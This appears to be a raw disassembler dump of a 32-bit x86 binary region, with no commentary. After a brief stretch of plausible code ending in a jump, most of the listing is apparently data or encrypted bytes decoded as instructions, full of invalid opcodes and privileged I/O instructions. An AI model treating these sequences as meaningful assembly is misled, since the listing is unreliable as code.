  40a239:	mov    eax,DWORD PTR [ebp-0x4]
  40a23c:	mov    edi,DWORD PTR [ebp-0x8]
  40a23f:	jmp    0x40c58e
  40a244:	pusha  
  40a245:	sub    DWORD PTR [ebx-0x11],eax
  40a248:	repz ja 0x40a1fb
  40a24b:	xchg   ebx,eax
  40a24c:	cli    
  40a24d:	adc    bl,ah
  40a24f:	je     0x40a2b8
  40a251:	mul    BYTE PTR [esi]
  40a253:	xchg   al,dl
  40a255:	add    eax,0x5f4e7c7c
  40a25a:	jl     0x40a2d8
  40a25c:	and    ecx,0x778055fe
  40a262:	adc    eax,0x7a9bee94
  40a267:	xor    DWORD PTR [ebx],ebp
  40a269:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a26a:	je     0x40a2d6
  40a26c:	je     0x40a2ac
  40a26e:	addr16 jge 0x40a2a9
  40a271:	push   0x8e88ce00
  40a276:	dec    edx
  40a277:	pushf  
  40a278:	mov    dl,0x51
  40a27a:	jmp    0xd95d:0xff945cbb
  40a281:	mov    DWORD PTR [eax+0x3f],ecx
  40a284:	jne    0x40a281
  40a286:	xchg   ecx,eax
  40a287:	outs   dx,BYTE PTR ds:[esi]
  40a288:	test   ah,cl
  40a28a:	in     al,dx
  40a28b:	idiv   esp
  40a28d:	pop    ebp
  40a28e:	sti    
  40a28f:	ins    BYTE PTR es:[edi],dx
  40a290:	in     al,dx
  40a291:	fs push ebx
  40a293:	repnz push edi
  40a296:	jmp    0x40a2e4
  40a298:	test   al,0x66
  40a29a:	aas    
  40a29b:	pop    eax
  40a29c:	cmp    ecx,DWORD PTR [edi]
  40a29e:	jp     0x40a26a
  40a2a0:	dec    BYTE PTR ds:0xd061a46d
  40a2a6:	lods   eax,DWORD PTR ds:[esi]
  40a2a7:	add    BYTE PTR [eax+0x3f],bh
  40a2aa:	mov    dh,0xed
  40a2ac:	test   DWORD PTR [ebx-0x6f46fae3],0x9b2b51fe
  40a2b6:	inc    edx
  40a2b7:	xor    eax,esi
  40a2b9:	scas   eax,DWORD PTR es:[edi]
  40a2ba:	cmp    ebx,ebp
  40a2bc:	(bad)  
  40a2bd:	mov    esi,0xd73605ec
  40a2c2:	and    al,al
  40a2c4:	xchg   edi,eax
  40a2c5:	ret    0x5f6b
  40a2c8:	pop    eax
  40a2c9:	adc    edx,DWORD PTR [ebp-0x33]
  40a2cc:	xchg   esi,eax
  40a2cd:	rcr    DWORD PTR [ebx-0x18274dd3],cl
  40a2d3:	das    
  40a2d4:	xchg   ebx,eax
  40a2d5:	push   edi
  40a2d6:	jmp    0x467e:0xc11e4e7a
  40a2dd:	pop    ebp
  40a2de:	xor    ecx,DWORD PTR [eax]
  40a2e0:	test   DWORD PTR [edi+0x4],eax
  40a2e3:	jmp    0x40a2f7
  40a2e5:	dec    edx
  40a2e6:	mov    bh,0x7c
  40a2e8:	test   esi,eax
  40a2ea:	stos   BYTE PTR es:[edi],al
  40a2eb:	scas   al,BYTE PTR es:[edi]
  40a2ec:	sbb    BYTE PTR [esi+eiz*8-0x47],ch
  40a2f0:	shl    cl,cl
  40a2f2:	test   BYTE PTR [ebp-0x42],0xc
  40a2f6:	adc    DWORD PTR [ecx],esp
  40a2f8:	stos   DWORD PTR es:[edi],eax
  40a2f9:	(bad)  
  40a2fa:	jns    0x40a300
  40a2fc:	jp     0x40a2c8
  40a2fe:	push   0x52
  40a300:	sbb    esp,DWORD PTR [edi-0x52]
  40a303:	fs loope 0x40a2aa
  40a306:	xchg   ebp,eax
  40a307:	sub    ecx,DWORD PTR [esp+eax*8]
  40a30a:	sub    eax,0x2ca04dab
  40a30f:	or     DWORD PTR [ecx-0x74],ebp
  40a312:	test   DWORD PTR [eax-0x4b0c4071],ebp
  40a318:	add    BYTE PTR [esi+ebp*4],0x38
  40a31c:	das    
  40a31d:	add    DWORD PTR [edx+0x77],ebx
  40a320:	push   ss
  40a321:	fs xchg ax,ax
  40a324:	inc    bx
  40a326:	pushf  
  40a327:	and    al,0x8c
  40a329:	xchg   BYTE PTR [edi],bl
  40a32b:	std    
  40a32c:	ret    
  40a32d:	jne    0x40a2fc
  40a32f:	mov    dl,BYTE PTR [eax]
  40a331:	fst    QWORD PTR [ecx+0x6b]
  40a334:	pop    edi
  40a335:	pop    ebx
  40a336:	xor    DWORD PTR [ebp-0x75],edi
  40a339:	push   ebp
  40a33a:	nop
  40a33b:	jl     0x40a3aa
  40a33d:	pop    ebp
  40a33e:	push   esp
  40a33f:	(bad)  
  40a340:	fcmovbe st,st(3)
  40a342:	xor    dh,dl
  40a344:	xor    ebp,0x7b
  40a347:	and    BYTE PTR [ecx],0x8
  40a34a:	mov    al,ds:0xe31cabd3
  40a34f:	cmp    DWORD PTR [edi+0x13],0x8ce17c68
  40a356:	xor    eax,0x5a356ce9
  40a35b:	adc    cl,ah
  40a35d:	hlt    
  40a35e:	sub    eax,0x7319f42
  40a363:	int3   
  40a364:	or     dh,BYTE PTR [ebp-0x17]
  40a367:	mov    ch,0xa8
  40a369:	ret    
  40a36a:	xchg   BYTE PTR [ebp+0x4e],bh
  40a36d:	iret   
  40a36e:	jnp    0x40a317
  40a370:	ja     0x40a332
  40a372:	in     eax,dx
  40a373:	pop    esp
  40a374:	dec    esp
  40a375:	repnz stos BYTE PTR es:[edi],al
  40a377:	out    0x36,eax
  40a379:	imul   esp,DWORD PTR [edx+0x3e5754ce],0x41
  40a380:	test   DWORD PTR [edi],edi
  40a382:	cmp    bl,dh
  40a384:	jl     0x40a315
  40a386:	imul   DWORD PTR [eax-0x4173d081]
  40a38c:	or     DWORD PTR [edi-0x73de0016],edx
  40a392:	stc    
  40a393:	mov    esp,DWORD PTR [ebx-0x1e]
  40a396:	sbb    al,0xd1
  40a398:	pop    eax
  40a399:	loop   0x40a3a3
  40a39b:	push   ds
  40a39c:	xchg   esi,eax
  40a39d:	pop    esp
  40a39e:	or     eax,0x9660245e
  40a3a3:	cmp    ah,BYTE PTR [edi]
  40a3a5:	and    ah,BYTE PTR gs:[esi-0x5]
  40a3a9:	dec    ecx
  40a3aa:	inc    ebx
  40a3ab:	fisttp DWORD PTR ds:0x488e2a1a
  40a3b1:	xor    BYTE PTR [eax+0x76877cb6],0x26
  40a3b8:	cmp    edi,DWORD PTR [ecx+0x25d9bac2]
  40a3be:	ror    BYTE PTR [ebp-0x4f],1
  40a3c1:	and    al,0xd1
  40a3c3:	lods   al,BYTE PTR ds:[esi]
  40a3c4:	dec    edi
  40a3c5:	test   DWORD PTR [edx],eax
  40a3c7:	in     al,dx
  40a3c8:	jle    0x40a3e3
  40a3ca:	iret   
  40a3cb:	sbb    edx,eax
  40a3cd:	lods   al,BYTE PTR ds:[esi]
  40a3ce:	jne    0x40a3a6
  40a3d0:	push   esi
  40a3d1:	cmp    DWORD PTR [ebp-0x11],esp
  40a3d4:	dec    edi
  40a3d5:	inc    edi
  40a3d6:	imul   eax,DWORD PTR [eax],0x1a
  40a3d9:	pop    eax
  40a3da:	jae    0x40a3fb
  40a3dc:	push   ds
  40a3dd:	in     eax,0x5b
  40a3df:	mov    bh,0x11
  40a3e1:	(bad)  
  40a3e5:	mov    dl,bl
  40a3e7:	jnp    0x40a444
  40a3e9:	fsubr  st(5),st
  40a3eb:	mov    ds:0x37d93f31,eax
  40a3f0:	lods   al,BYTE PTR ds:[esi]
  40a3f1:	mov    al,0xb4
  40a3f3:	je     0x40a3db
  40a3f5:	push   ebx
  40a3f6:	outs   dx,BYTE PTR ds:[esi]
  40a3f7:	pop    ss
  40a3f8:	jns    0x2f566247
  40a3fe:	mov    ebp,0xa31a4e1e
  40a403:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a404:	add    al,0xfa
  40a406:	stos   DWORD PTR es:[edi],eax
  40a407:	ss int3 
  40a409:	jo     0x40a418
  40a40b:	les    esi,FWORD PTR [esp+0x48]
  40a40f:	dec    edi
  40a410:	pop    edi
  40a411:	pop    edi
  40a412:	and    BYTE PTR [esi+0x77d48d97],cl
  40a418:	retf   0x60ca
  40a41b:	jne    0x40a492
  40a41d:	jbe    0x40a3fd
  40a41f:	repnz out 0xcc,eax
  40a422:	repnz inc eax
  40a424:	add    ebx,ebx
  40a426:	imul   ebp,DWORD PTR [ecx+0x42],0x54ad6ad0
  40a42d:	xchg   esi,eax
  40a42e:	sbb    eax,0x22cd8784
  40a433:	mov    BYTE PTR [eax-0x5f],ah
  40a436:	stos   BYTE PTR es:[edi],al
  40a437:	xor    BYTE PTR [esi-0x4d],0x21
  40a43b:	and    ch,ah
  40a43d:	dec    ch
  40a43f:	push   edi
  40a440:	add    cl,al
  40a442:	ror    BYTE PTR [ecx+eiz*8-0x3f],1
  40a446:	push   cs
  40a447:	pop    ebp
  40a448:	push   edx
  40a449:	sahf   
  40a44a:	fdivr  QWORD PTR [esi+0x22450737]
  40a450:	xor    cl,BYTE PTR [esi-0x2e]
  40a453:	cs loopne 0x40a4ae
  40a456:	je     0x40a3ee
  40a458:	daa    
  40a459:	adc    DWORD PTR [esi+0x3a],ecx
  40a45c:	imul   DWORD PTR [ebx-0x39806e20]
  40a462:	push   edi
  40a463:	in     al,dx
  40a464:	mov    ax,ds:0xcc7e16b
  40a46a:	je     0x40a42b
  40a46c:	xchg   DWORD PTR [edi],eax
  40a46e:	inc    ebx
  40a46f:	or     eax,0x8d42d181
  40a474:	inc    esp
  40a475:	push   esp
  40a476:	leave  
  40a477:	je     0x40a4d0
  40a479:	xchg   esi,eax
  40a47a:	jmp    0x40a4b3
  40a47c:	hlt    
  40a47d:	pop    ecx
  40a47e:	xor    eax,0xc2f5424a
  40a483:	jge    0x40a434
  40a485:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a486:	bound  edx,QWORD PTR gs:[edi+0xb]
  40a48a:	imul   ebp,DWORD PTR [edi],0x34
  40a48d:	jecxz  0x40a413
  40a48f:	push   edx
  40a490:	cs shl eax,cl
  40a493:	adc    al,0xe1
  40a495:	out    dx,eax
  40a496:	and    al,0xf5
  40a498:	stos   DWORD PTR es:[edi],eax
  40a499:	imul   esp,DWORD PTR [edx],0xc985cb6c
  40a49f:	jns    0x40a4b6
  40a4a1:	add    eax,0x747bc99c
  40a4a6:	sar    BYTE PTR [edi],1
  40a4a8:	push   ecx
  40a4a9:	hlt    
  40a4aa:	fwait
  40a4ab:	rcr    DWORD PTR [ebp+0x24b0b29e],0xf3
  40a4b2:	es inc bx
  40a4b5:	loopne 0x40a474
  40a4b7:	adc    BYTE PTR [ebp+0x43],bh
  40a4ba:	pop    edi
  40a4bb:	das    
  40a4bc:	in     al,0x72
  40a4be:	loope  0x40a4f4
  40a4c0:	cmp    dh,BYTE PTR [ebx]
  40a4c2:	sbb    al,0xee
  40a4c4:	add    al,0x4d
  40a4c6:	hlt    
  40a4c7:	fbstp  TBYTE PTR [eax]
  40a4c9:	in     eax,dx
  40a4ca:	(bad)  
  40a4cb:	jno    0x40a4d0
  40a4cd:	call   0x6859b1f1
  40a4d2:	jmp    DWORD PTR [ebp+0x5c96985]
  40a4d8:	xchg   esp,eax
  40a4d9:	or     BYTE PTR [eax],cl
  40a4db:	aam    0x8b
  40a4dd:	mov    edi,DWORD PTR [ebx+eax*4-0x65]
  40a4e1:	fdivr  st(4),st
  40a4e3:	jg     0x40a4a3
  40a4e5:	loope  0x40a46c
  40a4e7:	mov    eax,0xfb63b9c5
  40a4ec:	mov    bl,0xb9
  40a4ee:	add    ebp,DWORD PTR [ebp+0x47]
  40a4f1:	gs pop eax
  40a4f3:	mov    DWORD PTR [edx-0x8],edi
  40a4f6:	jnp    0x40a520
  40a4f8:	(bad)  
  40a4f9:	repz enter 0x5a03,0xfb
  40a4fe:	cli    
  40a4ff:	into   
  40a500:	jmp    0x6e6d4f35
  40a505:	test   al,0xb
  40a507:	inc    ebx
  40a508:	jnp    0x40a576
  40a50a:	clc    
  40a50b:	aam    0x8b
  40a50d:	jmp    FWORD PTR [edx+0x10113dcf]
  40a513:	sbb    BYTE PTR [ebx+0x5d],bl
  40a516:	es out 0x35,eax
  40a519:	stos   BYTE PTR es:[edi],al
  40a51a:	icebp  
  40a51b:	mov    cl,0x7d
  40a51d:	sbb    eax,0xaed66deb
  40a522:	imul   esi,DWORD PTR [ebp+0x36dbb029],0xc1e09275
  40a52c:	inc    ecx
  40a52d:	fwait
  40a52e:	inc    ebx
  40a52f:	and    al,0x2d
  40a531:	std    
  40a532:	jb     0x40a4b8
  40a534:	int    0x2b
  40a536:	xchg   esi,eax
  40a537:	inc    ecx
  40a538:	bound  esp,QWORD PTR [esi-0x1231a78e]
  40a53e:	push   0xffffffe8
  40a540:	dec    edx
  40a541:	adc    bh,BYTE PTR [esi+0xa5e6e05]
  40a547:	stos   BYTE PTR es:[edi],al
  40a548:	inc    esp
  40a549:	or     ah,dh
  40a54b:	out    dx,al
  40a54c:	dec    edi
  40a54d:	out    0x61,al
  40a54f:	mov    esi,0xcc70bd5f
  40a554:	mov    bl,0xa0
  40a556:	(bad)  
  40a557:	aam    0xc3
  40a559:	pop    esp
  40a55a:	push   edx
  40a55b:	pop    ss
  40a55c:	scas   eax,DWORD PTR es:[edi]
  40a55d:	or     eax,DWORD PTR [edx]
  40a55f:	mov    BYTE PTR [edx+edx*8],bh
  40a562:	jb     0x40a5be
  40a564:	mov    al,0x9a
  40a566:	xlat   BYTE PTR ds:[ebx]
  40a567:	inc    edi
  40a568:	mov    bh,0xcc
  40a56a:	leave  
  40a56b:	retf   0xb3ed
  40a56e:	sub    dh,BYTE PTR [ebx+0x13cde84a]
  40a574:	pop    edx
  40a575:	imul   ebx,DWORD PTR [ecx+edx*8],0xffffff91
  40a579:	sub    BYTE PTR [esi-0xcdd4605],0x66
  40a580:	jnp    0x40a585
  40a582:	xor    dl,BYTE PTR [ebp+0x8560934]
  40a588:	and    al,dh
  40a58a:	mov    WORD PTR [edx-0x6a],cs
  40a58d:	or     eax,0x559b4888
  40a592:	(bad)
  40a596:	jne    0x40a52a
  40a598:	jmp    0x40a53b
  40a59a:	sbb    BYTE PTR [esi-0x23],cl
  40a59d:	push   esi
  40a59e:	sub    al,0x19
  40a5a0:	sar    DWORD PTR [ebx+0x3467eb0a],0x20
  40a5a7:	in     eax,0x0
  40a5a9:	leave  
  40a5aa:	repz mov ds:0x548e54b5,eax
  40a5b0:	xchg   edi,eax
  40a5b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5b2:	cwde   
  40a5b3:	sysret 
  40a5b5:	xchg   ecx,eax
  40a5b6:	sub    bh,bl
  40a5b8:	add    DWORD PTR [edi-0x76ea373c],0x57
  40a5bf:	mov    WORD PTR [eax+edi*2],fs
  40a5c2:	add    ch,ch
  40a5c4:	sub    al,0x48
  40a5c6:	neg    BYTE PTR [ebx]
  40a5c8:	hlt    
  40a5c9:	push   ss
  40a5ca:	and    BYTE PTR [ebp-0x6b],0x3e
  40a5ce:	fs into 
  40a5d0:	popf   
  40a5d1:	sbb    BYTE PTR [eax-0x39ffb357],cl
  40a5d7:	dec    esi
  40a5d9:	push   ebx
  40a5da:	(bad)  
  40a5db:	adc    eax,0x21528bdd
  40a5e0:	mov    fs,edx
  40a5e2:	push   edi
  40a5e3:	jbe    0x40a61a
  40a5e5:	repz dec esp
  40a5e7:	xchg   BYTE PTR [ecx],cl
  40a5e9:	rcr    al,cl
  40a5eb:	out    0x38,al
  40a5ed:	in     eax,0x29
  40a5ef:	jae    0x40a61b
  40a5f1:	out    0xa,al
  40a5f3:	jge    0x40a605
  40a5f5:	xor    al,0x49
  40a5f7:	das    
  40a5f8:	fistp  DWORD PTR [ebx]
  40a5fa:	dec    edi
  40a5fb:	mov    BYTE PTR [esi-0x6738cecd],bl
  40a601:	jb     0x40a64a
  40a603:	cmc    
  40a604:	mov    ch,0xd
  40a606:	not    BYTE PTR [eax-0x29]
  40a609:	outs   dx,DWORD PTR ds:[esi]
  40a60a:	sub    al,0xba
  40a60c:	data16 jae 0x40a62d
  40a60f:	mov    ss,esp
  40a611:	add    ebx,ecx
  40a613:	clc    
  40a614:	ins    DWORD PTR es:[edi],dx
  40a615:	mov    al,0x87
  40a617:	jg     0x40a5d3
  40a619:	pop    esp
  40a61a:	sub    dl,BYTE PTR [eax+ecx*2]
  40a61d:	mov    esi,ds
  40a61f:	dec    ebx
  40a620:	and    DWORD PTR [ecx-0x16],esi
  40a623:	adc    DWORD PTR [esi+0x4f],ebp
  40a626:	add    ebx,DWORD PTR [edi+0x798aff05]
  40a62c:	cwde   
  40a62d:	cmp    eax,0x5c7c7167
  40a632:	pop    eax
  40a633:	(bad)  
  40a634:	scas   al,BYTE PTR es:[edi]
  40a635:	jns    0x40a5dc
  40a637:	pop    ebx
  40a638:	(bad)  
  40a639:	push   ebp
  40a63a:	imul   esi,DWORD PTR [ebp+edx*4-0x69],0x30fd9aa8
  40a642:	push   ebp
  40a643:	cdq    
  40a644:	fnstenv [ebx-0x69]
  40a647:	dec    ebx
  40a648:	lds    ecx,FWORD PTR [edi-0x25]
  40a64b:	cs in  al,0x1f
  40a64e:	jle    0x40a635
  40a650:	mov    ah,0x12
  40a652:	inc    esi
  40a653:	sub    DWORD PTR [ecx+0x34f19da2],esp
  40a659:	mov    DWORD PTR [edi+0x3b],ebx
  40a65c:	cmc    
  40a65d:	test   al,0xb1
  40a65f:	mov    dh,BYTE PTR [edi]
  40a661:	inc    ebx
  40a662:	pop    ebx
  40a663:	loop   0x40a617
  40a665:	outs   dx,BYTE PTR ds:[esi]
  40a666:	pop    ds
  40a667:	scas   eax,DWORD PTR es:[edi]
  40a668:	and    esi,DWORD PTR [esi-0x760a9813]
  40a66e:	mov    edx,0x8c8500
  40a673:	sub    DWORD PTR ds:0x95124fc8,ebx
  40a679:	in     eax,0x94
  40a67b:	ins    BYTE PTR es:[edi],dx
  40a67c:	adc    eax,0x119c7812
  40a681:	pop    esi
  40a682:	or     ah,dh
  40a684:	stc    
  40a685:	call   0x81fa:0xd739b86f
  40a68c:	inc    ebx
  40a68d:	shl    DWORD PTR [edx-0x1f],cl
  40a690:	pop    ds
  40a691:	daa    
  40a692:	hlt    
  40a693:	rol    BYTE PTR [esi+0x12],cl
  40a696:	test   DWORD PTR [ebp+0x2cfe9a42],esp
  40a69c:	pop    edi
  40a69d:	xchg   esi,eax
  40a69e:	pop    eax
  40a69f:	sub    al,0xc0
  40a6a1:	xchg   ah,dl
  40a6a3:	push   cs
  40a6a4:	iret   
  40a6a5:	aad    0x92
  40a6a7:	rcr    BYTE PTR [edi+0x3f],1
  40a6aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a6ab:	(bad)  [ebx]
  40a6ad:	push   ebp
  40a6ae:	pop    esi
  40a6af:	add    al,al
  40a6b1:	icebp  
  40a6b2:	or     al,0x7f
  40a6b4:	out    dx,al
  40a6b5:	cmp    eax,0xd0dc940a
  40a6ba:	cmp    ebx,edx
  40a6bc:	push   cs
  40a6bd:	pushf  
  40a6be:	ins    DWORD PTR es:[edi],dx
  40a6bf:	adc    esi,DWORD PTR [edx+0x4]
  40a6c2:	lds    ebx,FWORD PTR [ebx+0xd1dc557]
  40a6c8:	iret   
  40a6c9:	lahf   
  40a6ca:	push   ss
  40a6cb:	(bad)  
  40a6cc:	pop    ebp
  40a6cd:	push   ebp
  40a6ce:	sar    BYTE PTR [ecx],1
  40a6d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a6d1:	sbb    BYTE PTR ds:0x363314ab,cl
  40a6d7:	inc    edi
  40a6d8:	mov    eax,0x7258db9e
  40a6dd:	add    bl,bl
  40a6df:	sbb    BYTE PTR [eax],dl
  40a6e1:	gs xchg ebx,eax
  40a6e3:	inc    esp
  40a6e4:	inc    esp
  40a6e5:	cmc    
  40a6e6:	xor    eax,0x11b228b
  40a6eb:	add    al,0xbf
  40a6ed:	nop
  40a6ee:	xchg   BYTE PTR [edx+ebp*4],bh
  40a6f1:	xor    ebp,ebx
  40a6f3:	add    BYTE PTR [ebp+eiz*2+0x1],al
  40a6f7:	ja     0x40a768
  40a6f9:	cwde   
  40a6fa:	sbb    eax,0x8971914e
  40a6ff:	sub    ah,BYTE PTR [ebx+0x4d73df13]
  40a705:	mov    ecx,0x3ea0f4d3
  40a70a:	out    dx,al
  40a70b:	sahf   
  40a70c:	push   es
  40a70d:	popa   
  40a70e:	jle    0x40a6c8
  40a710:	adc    cl,BYTE PTR [edi+0x13]
  40a713:	jne    0x40a72e
  40a715:	bound  edi,QWORD PTR [ebx-0x5a]
  40a718:	into   
  40a719:	or     DWORD PTR gs:[ebx],esp
  40a71c:	cwde   
  40a71d:	mul    DWORD PTR [ecx-0x6b]
  40a720:	test   bh,ch
  40a722:	mov    eax,0x947e90b6
  40a727:	test   DWORD PTR [ecx+edx*4+0x49],edx
  40a72b:	aas    
  40a72c:	pushf  
  40a72d:	mov    esi,0x87873d89
  40a732:	pop    esi
  40a733:	push   0x53f125a2
  40a738:	push   ebp
  40a739:	imul   BYTE PTR [ecx]
  40a73b:	mov    ebp,0x8c9930b0
  40a740:	dec    edi
  40a741:	sub    al,0xc3
  40a743:	outs   dx,BYTE PTR ds:[esi]
  40a744:	cmp    bh,ch
  40a746:	scas   al,BYTE PTR es:[edi]
  40a747:	sub    ecx,esi
  40a749:	jp     0x40a70b
  40a74b:	mov    edi,DWORD PTR ds:0xeef9be7f
  40a751:	mov    BYTE PTR [esi+0x2b91397f],ch
  40a757:	xor    ecx,ebx
  40a759:	jnp    0x40a7a8
  40a75b:	out    dx,al
  40a75c:	ins    BYTE PTR es:[edi],dx
  40a75d:	sub    edx,DWORD PTR [ebx-0x3c530d39]
  40a763:	mov    ch,0x96
  40a765:	call   FWORD PTR [edi]
  40a767:	adc    al,0x1e
  40a769:	nop
  40a76a:	std    
  40a76b:	cmp    DWORD PTR [ecx+0x30],eax
  40a76e:	mov    DWORD PTR [edx+0x560c660a],esp
  40a774:	mov    esp,0x7e586c90
  40a779:	pop    ds
  40a77a:	push   0x2f
  40a77c:	ss in  eax,dx
  40a77e:	inc    edi
  40a77f:	clc    
  40a780:	dec    edx
  40a781:	push   cs
  40a782:	loopne 0x40a7dd
  40a784:	iret   
  40a785:	xchg   edi,eax
  40a786:	mov    ah,0x60
  40a788:	fist   DWORD PTR [ebx+0x37]
  40a78b:	dec    esi
  40a78c:	hlt    
  40a78d:	push   ds
  40a78e:	mov    cl,0xb5
  40a790:	(bad)  
  40a791:	mov    edx,0xc9705fa9
  40a796:	sub    al,0x2a
  40a798:	push   cs
  40a799:	jo     0x40a7cb
  40a79b:	test   eax,0xc6100403
  40a7a0:	retf   0x3a2c
  40a7a3:	(bad)  
  40a7a4:	adc    dl,bl
  40a7a6:	dec    ebp
  40a7a7:	sbb    BYTE PTR [edi+0x7075f4f3],dh
  40a7ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7ae:	mov    edx,0x8ca58927
  40a7b3:	and    al,0x9a
  40a7b5:	shr    cl,1
  40a7b7:	mov    ds:0x9341eba3,eax
  40a7bc:	frstor [edx-0x24]
  40a7bf:	push   ds
  40a7c0:	jb     0x40a7e2
  40a7c2:	test   BYTE PTR [esi],cl
  40a7c4:	sub    al,0x44
  40a7c6:	loop   0x40a7f5
  40a7c8:	inc    ecx
  40a7c9:	adc    DWORD PTR [ebp+0x94f1734],ebx
  40a7cf:	call   0xdc45:0xcfa0f48b
  40a7d6:	ds je  0x40a7b6
  40a7d9:	or     eax,ecx
  40a7db:	mov    edx,0x71224bb8
  40a7e0:	mov    dl,0x67
  40a7e2:	ret    0x2321
  40a7e5:	mov    ah,0xf5
  40a7e7:	or     DWORD PTR [ecx],edi
  40a7e9:	data16 jl 0x40a7db
  40a7ec:	clc    
  40a7ed:	add    ecx,DWORD PTR [eax]
  40a7ef:	stos   BYTE PTR es:[edi],al
  40a7f0:	lahf   
  40a7f1:	xchg   esp,eax
  40a7f2:	pop    edi
  40a7f3:	dec    esp
  40a7f4:	sbb    eax,0xa53deeba
  40a7f9:	popa   
  40a7fa:	int3   
  40a7fb:	call   0xd857d317
  40a800:	scas   al,BYTE PTR es:[edi]
  40a801:	push   0x29034e29
  40a806:	fidiv  WORD PTR [ebp+0xe]
  40a809:	mov    bh,0x34
  40a80b:	jnp    0x40a851
  40a80d:	jg     0x40a822
  40a80f:	sbb    eax,0xb495c876
  40a814:	xchg   edi,eax
  40a815:	xlat   BYTE PTR ds:[ebx]
  40a816:	shl    BYTE PTR [ebx],cl
  40a818:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a819:	ds pushf 
  40a81b:	inc    ebx
  40a81c:	in     al,dx
  40a81d:	je     0x40a87e
  40a81f:	das    
  40a820:	or     dl,BYTE PTR [ecx+eiz*8-0x1da798c7]
  40a827:	add    BYTE PTR [ebx],ch
  40a829:	inc    edi
  40a82a:	dec    esi
  40a82b:	lahf   
  40a82c:	iret   
  40a82d:	gs mov edx,0xf56bd09c
  40a833:	push   ecx
  40a834:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a835:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a836:	fwait
  40a837:	cmp    DWORD PTR [ebp+0x5],edi
  40a83a:	ins    DWORD PTR es:[edi],dx
  40a83b:	mov    DWORD PTR [ebx+0x5469d060],ecx
  40a841:	jns    0x40a81c
  40a843:	and    BYTE PTR [esi-0x79],ah
  40a846:	xor    BYTE PTR [eax+0x47c92251],bl
  40a84c:	add    eax,0x55fd8ef0
  40a851:	ror    DWORD PTR [ebx+0x2b],cl
  40a854:	mov    ecx,es
  40a856:	sub    DWORD PTR [ecx-0xa],esp
  40a859:	push   cs
  40a85a:	in     al,0x3f
  40a85c:	das    
  40a85d:	das    
  40a85e:	cmc    
  40a85f:	add    DWORD PTR ds:[edx],esi
  40a862:	mov    cl,BYTE PTR [edi-0x57]
  40a865:	xor    BYTE PTR [edx],ch
  40a867:	in     eax,dx
  40a868:	(bad)  
  40a869:	cmp    ecx,esi
  40a86b:	sub    DWORD PTR [esi+0x39],ebx
  40a86e:	xchg   ebp,eax
  40a86f:	icebp  
  40a870:	xlat   BYTE PTR ds:[ebx]
  40a871:	add    al,BYTE PTR [ebx+0x42abc698]
  40a877:	ret    0x573c
  40a87a:	mov    dh,BYTE PTR [ebx-0x49cf85fc]
  40a880:	in     al,dx
  40a881:	rol    esp,1
  40a883:	xchg   cx,ax
  40a885:	mov    ds:0xe82a5419,eax
  40a88a:	mov    dl,0x4c
  40a88c:	pop    ebx
  40a88d:	jecxz  0x40a8c4
  40a88f:	das    
  40a890:	mov    DWORD PTR [esi+0x39],esi
  40a893:	dec    edx
  40a894:	jo     0x40a842
  40a896:	push   ecx
  40a898:	es pop ecx
  40a89a:	push   0xffffffa0
  40a89c:	push   es
  40a89d:	and    al,0xcd
  40a89f:	jns    0x40a821
  40a8a1:	(bad)  
  40a8a2:	imul   edi
  40a8a4:	jbe    0x40a8f4
  40a8a6:	inc    esi
  40a8a7:	and    ebp,edx
  40a8a9:	ds pop edx
  40a8ab:	sbb    BYTE PTR [ebx+0x16],bh
  40a8ae:	pop    esi
  40a8af:	outs   dx,BYTE PTR ds:[esi]
  40a8b0:	add    BYTE PTR [edi-0x56be7939],ah
  40a8b6:	ds sub al,0x16
  40a8b9:	sbb    al,0x5b
  40a8bb:	mov    ecx,0x46b2e875
  40a8c0:	(bad)  
  40a8c1:	sbb    bh,BYTE PTR [ebp-0x4649b647]
  40a8c7:	cmp    eax,0x79e92d36
  40a8cc:	pop    ss
  40a8cd:	cs stos DWORD PTR es:[edi],eax
  40a8cf:	imul   DWORD PTR [ebp+ecx*2-0x7f05a1d9]
  40a8d6:	icebp  
  40a8d7:	cmp    ebx,DWORD PTR [ebp+edi*2+0x5e664976]
  40a8de:	fs scas eax,DWORD PTR es:[edi]
  40a8e0:	cmp    BYTE PTR [edx+0x1c],bl
  40a8e3:	out    0x5a,al
  40a8e5:	aam    0x9f
  40a8e7:	xchg   BYTE PTR [ecx],dh
  40a8e9:	xlat   BYTE PTR ds:[ebx]
  40a8ea:	in     al,0xd3
  40a8ec:	and    esi,DWORD PTR [edi]
  40a8ee:	ficomp WORD PTR [esp+esi*2-0x34d7932c]
  40a8f5:	sar    ah,cl
  40a8f7:	mov    DWORD PTR [esi+0x3d],0xb02b0582
  40a8fe:	imul   ebx,DWORD PTR [eax-0x3f095d99],0xffffff80
  40a905:	std    
  40a906:	adc    ebx,DWORD PTR [ebx-0x15f45f64]
  40a90c:	pop    edx
  40a90d:	dec    ebx
  40a90e:	mov    BYTE PTR [edx],bh
  40a910:	push   ebx
  40a911:	xchg   edx,eax
  40a912:	and    eax,0x21f8c239
  40a917:	in     al,0xf6
  40a919:	js     0x40a8e6
  40a91b:	stc    
  40a91c:	mov    al,ds:0x6addb1a7
  40a921:	xchg   DWORD PTR [ecx],esi
  40a923:	xor    DWORD PTR [edx+0x6a],edx
  40a926:	cdq    
  40a927:	xlat   BYTE PTR ds:[ebx]
  40a928:	loop   0x40a97c
  40a92a:	mov    ch,ah
  40a92c:	jle    0x40a959
  40a92e:	ret    0xb2f8
  40a931:	shr    DWORD PTR [ecx-0x33],1
  40a934:	inc    esp
  40a935:	outs   dx,DWORD PTR ds:[esi]
  40a936:	cmp    BYTE PTR [ebx+0x4458e936],bl
  40a93c:	sbb    ch,BYTE PTR [esi-0x6bab8233]
  40a942:	pusha  
  40a943:	add    ah,BYTE PTR [esi+0x78]
  40a946:	pop    ds
  40a947:	inc    esp
  40a948:	div    BYTE PTR [ebp+0x648e8d00]
  40a94e:	xchg   ebp,eax
  40a94f:	mov    esp,0x4fdd1886
  40a954:	push   0x4f
  40a956:	mov    eax,ds:0x77f1887e
